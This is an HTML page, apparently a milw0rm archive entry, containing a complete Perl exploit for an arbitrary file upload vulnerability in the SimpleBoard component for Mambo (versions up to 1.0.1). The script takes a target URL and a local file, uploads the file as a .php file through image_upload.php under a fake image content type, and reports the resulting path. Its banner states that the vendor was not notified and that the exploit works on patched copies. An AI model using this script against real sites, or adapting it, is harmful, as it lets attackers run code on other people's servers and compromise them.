<html><head><title>Mambo Component SimpleBoard <= 1.0.1 Arbitrary File Upload Exploit</title></head><pre>#!/usr/bin/perl

use warnings;
use strict;
use LWP::UserAgent;
use HTTP::Request::Common;

my $fname = rand(99999) . &quot;.php&quot;; # no int()

print &lt;&lt;INTRO;

- SimpleBoard Mambo Component &lt;= 1.0.1 -
- Remote Arbitrary File Upload Exploit -
    
    Discovered &amp;&amp; Coded by: t0pP8uZz
    Discovered on: 20 October 2008
    Vendor has not been notified!
    
    Note:
    
        This exploit is a completely diffrent
            method then the prior simpleboard vulns.
            which differs from the one
            located here: http://milw0rm.com/exploits/1994
            
        Same files vulnerable, But this one works with
            the patch! in later versions of
            SimpleBoard they removed the image_upload.php so
            this wont work. but this
            works on every image_upload.php version. with the
            patch in place!
            
        A common error for the exploit is if openbase_dir is
            enabled, then this means
            the file will not get uploaded due to the
            dir restrictions.
            
    - Peace
    - irc.rizon.net #sectalk

INTRO

print &quot;\nEnter URL(ie: http://site.com/mambo): &quot;;
    chomp(my $url=&lt;STDIN&gt;);
    
print &quot;\nEnter File Path(path to local file to upload): &quot;;
    chomp(my $file=&lt;STDIN&gt;);

my $ua = LWP::UserAgent-&gt;new;
my $re = $ua-&gt;request(POST $url.'/components/com_simpleboard/image_upload.php',
                      Content_Type =&gt; 'form-data',
                      Content      =&gt; [ attachimage =&gt; [ $file, $fname, Content_Type =&gt; 'image/jpeg' ], ] );

die &quot;HTTP POST Failed!&quot; unless $re-&gt;is_success;

if($re-&gt;content =~ /open_basedir/) {
    
    print &quot;open_basedir restriction enabled. Exploit failed. See php.ini for more details.\n&quot;; # say() ? get perl510
}
else {
 
    print &quot;Looks like exploit was successfull! for uploaded file check:  &quot; . $url . &quot;/components/com_simpleboard/&quot; . $fname . &quot;\n&quot;;   
}
exit;

# milw0rm.com [2008-10-29]</pre></html>